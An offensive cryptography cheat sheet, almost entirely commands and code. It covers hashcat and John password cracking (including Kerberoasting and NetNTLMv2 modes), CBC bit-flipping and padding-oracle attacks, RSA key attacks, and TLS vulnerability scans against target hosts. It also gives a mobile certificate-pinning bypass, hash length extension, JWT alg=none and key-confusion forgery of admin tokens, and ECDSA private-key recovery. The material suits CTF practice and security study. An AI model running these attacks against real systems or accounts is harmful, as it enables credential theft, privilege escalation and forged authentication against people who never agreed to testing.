# Cryptographic Attack Techniques

## Hash Cracking — Hashcat
```bash
# Identify hash type
hashid 'e99a18c428cb38d5f260853678922e03'     # auto-detect hash type
hashcat --identify hash.txt                    # hashcat native identifier
nth -f hash.txt                                # Name-That-Hash

# Common hash modes
hashcat -m 0    hash.txt wordlist.txt          # MD5
hashcat -m 100  hash.txt wordlist.txt          # SHA1
hashcat -m 1400 hash.txt wordlist.txt          # SHA256
hashcat -m 1800 hash.txt wordlist.txt          # sha512crypt ($6$)
hashcat -m 1000 hash.txt wordlist.txt          # NTLM
hashcat -m 3200 hash.txt wordlist.txt          # bcrypt ($2*$)
hashcat -m 13100 hash.txt wordlist.txt         # Kerberos TGS-REP (Kerberoasting)
hashcat -m 18200 hash.txt wordlist.txt         # Kerberos AS-REP (ASREPRoast)
hashcat -m 22000 hash.hc22000 wordlist.txt     # WPA-PBKDF2-PMKID+EAPOL
hashcat -m 5600 hash.txt wordlist.txt          # NetNTLMv2 (Responder captures)

# Attack modes
hashcat -m 0 -a 0 hash.txt rockyou.txt        # dictionary attack
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule  # rules-based
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?d?d'  # mask: Abcde12
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?l?d?d?s'  # mask: Abcdef12!
hashcat -m 0 -a 6 hash.txt wordlist.txt '?d?d?d'  # hybrid: word + 3 digits
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt  # combinator

# Mask charsets: ?l=a-z ?u=A-Z ?d=0-9 ?s=special ?a=all printable
# Custom charset: hashcat -m 0 -a 3 -1 '?l?d' hash.txt '?1?1?1?1?1?1'

# John the Ripper alternative
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --show hash.txt                           # show cracked passwords
```

## Symmetric Cipher Attacks
```python
# AES-ECB detection — identical plaintext blocks produce identical ciphertext blocks
ciphertext = bytes.fromhex("CIPHERTEXT_HEX")
blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
if len(blocks) != len(set(blocks)):
    print("ECB MODE DETECTED — repeated blocks found")

# AES-CBC bit-flipping — modify ciphertext block N to control plaintext block N+1
# Flipping bit at position i in block N flips same bit in decrypted block N+1
# Target: change "role=user" to "role=admin" in cookie
import struct
ct = bytearray(ciphertext)
target_offset = block_size * (target_block - 1)  # modify PREVIOUS block
for i, (old, new) in enumerate(zip(b"user\x00", b"admin")):
    ct[target_offset + byte_offset + i] ^= old ^ new

# Padding oracle attack — decrypt CBC ciphertext without key
# Tool: padbuster
padbuster http://target.com/decrypt?data=CIPHERTEXT CIPHERTEXT 16 -encoding 0
# 16 = block size, -encoding 0 = hex
# Manual: for each byte position, try all 256 values until valid padding response

# AES-CTR nonce reuse — XOR two ciphertexts to get XOR of plaintexts
c1 = bytes.fromhex("CT1"); c2 = bytes.fromhex("CT2")
xored = bytes(a ^ b for a, b in zip(c1, c2))
# Known plaintext at any position in one message reveals the other: p2 = xored ^ p1
# Crib dragging: try common words at each offset
```

## RSA Attacks
```bash
# Extract public key parameters
openssl rsa -pubin -in pub.pem -text -noout    # n, e values
python3 -c "from Crypto.PublicKey import RSA; k=RSA.import_key(open('pub.pem').read()); print(f'n={k.n}\ne={k.e}')"

# RsaCtfTool — automated attacks
RsaCtfTool --publickey pub.pem --uncipherfile flag.enc  # try all attacks
RsaCtfTool --publickey pub.pem --attack wiener          # small private exponent
RsaCtfTool --publickey pub1.pem --publickey pub2.pem --attack common_factor  # shared factor
```
```python
# Small public exponent (e=3) — cube root attack
from gmpy2 import iroot
c = int.from_bytes(open('flag.enc','rb').read(), 'big')
m, exact = iroot(c, 3)  # if m^3 == c (no modular reduction), plaintext recovered
if exact: print(m.to_bytes(256, 'big').strip(b'\x00'))

# Hastad's broadcast attack — same message, same e, different n
# Given c1=m^e mod n1, c2=m^e mod n2, c3=m^e mod n3 (e=3)
from sympy.ntheory.modular import crt
n_list = [n1, n2, n3]; c_list = [c1, c2, c3]
M, _ = crt(n_list, c_list)
m, _ = iroot(M, 3)

# Fermat's factorization — when p and q are close
from gmpy2 import isqrt, is_square
a = isqrt(n) + 1
while not is_square(a*a - n): a += 1
p = a + isqrt(a*a - n); q = n // p

# Wiener's attack — small d (d < n^0.25 / 3)
# Continued fraction expansion of e/n reveals convergent k/d
from Crypto.PublicKey import RSA
import owiener
d = owiener.attack(e, n)
if d: print(pow(c, d, n).to_bytes(256, 'big'))
```

## Protocol and TLS Attacks
```bash
# TLS audit — comprehensive scan
testssl.sh --full https://target.com           # all checks: ciphers, protocols, vulns
testssl.sh --vulnerable https://target.com     # only vulnerability checks

# Specific vulnerability checks
testssl.sh --poodle https://target.com         # SSLv3 CBC padding oracle
testssl.sh --drown https://target.com          # SSLv2 cross-protocol attack
testssl.sh --freak https://target.com          # export cipher downgrade
testssl.sh --heartbleed https://target.com     # OpenSSL memory leak
testssl.sh --robot https://target.com          # Bleichenbacher RSA padding oracle
testssl.sh --beast https://target.com          # CBC-mode chosen plaintext

# OpenSSL manual checks
openssl s_client -connect target.com:443 -tls1 # test TLS 1.0 support
openssl s_client -connect target.com:443 -ssl3 2>&1 | grep -i "alert\|error"  # SSLv3
openssl s_client -connect target.com:443 -cipher 'EXPORT' 2>&1 | grep Cipher  # export ciphers
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer

# Certificate pinning bypass (mobile apps)
# Frida + objection
objection -g com.target.app explore
android sslpinning disable                     # auto-bypass common pinning implementations
```

## Implementation Flaws
```python
# Hash length extension attack — extend MAC without knowing key
# Vulnerable: MAC = H(key || message), attacker can append data
# hashpump: given H(key||msg), len(key), msg → H(key||msg||pad||extension)
import hashpumpy
original_mac = "KNOWN_MAC_HEX"
original_data = b"original_message"
append_data = b"&admin=true"
for key_len in range(1, 64):  # brute force key length
    new_mac, new_data = hashpumpy.hashpump(original_mac, original_data, append_data, key_len)
    # try new_mac + new_data against server

# JWT signature bypass
import jwt, json, base64
# alg=none attack
token = jwt.encode({"sub": "admin", "role": "admin"}, key="", algorithm="none")

# RS256 → HS256 confusion: server uses RSA public key as HMAC secret
public_key = open("public.pem").read()
forged = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")

# Nonce reuse in ECDSA — recover private key
# Given two signatures (r, s1) and (r, s2) with same k:
# k = (m1 - m2) * inverse(s1 - s2, n) mod n
# d = (s1 * k - m1) * inverse(r, n) mod n
from Crypto.Util.number import inverse
k = ((m1 - m2) * inverse(s1 - s2, n)) % n
d = ((s1 * k - m1) * inverse(r, n)) % n  # private key recovered
```

## Tools Reference
```bash
# CyberChef — browser-based crypto Swiss army knife
# https://gchq.github.io/CyberChef/ — chain operations: From Hex → XOR → Gunzip → strings

# SageMath — mathematical computations for crypto
sage -c "
n = 0xDEADBEEF; e = 65537; c = 0xCAFEBABE
p = factor(n)[0][0]; q = n // p
d = inverse_mod(e, (p-1)*(q-1))
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]))
"

# Frequency analysis for classical ciphers
python3 -c "
from collections import Counter
ct = open('cipher.txt').read().upper()
freq = Counter(c for c in ct if c.isalpha())
for char, count in freq.most_common(): print(f'{char}: {count} ({count/len(ct)*100:.1f}%)')
"
# English frequency: ETAOINSHRDLCUMWFGYPBVKJXQZ
```
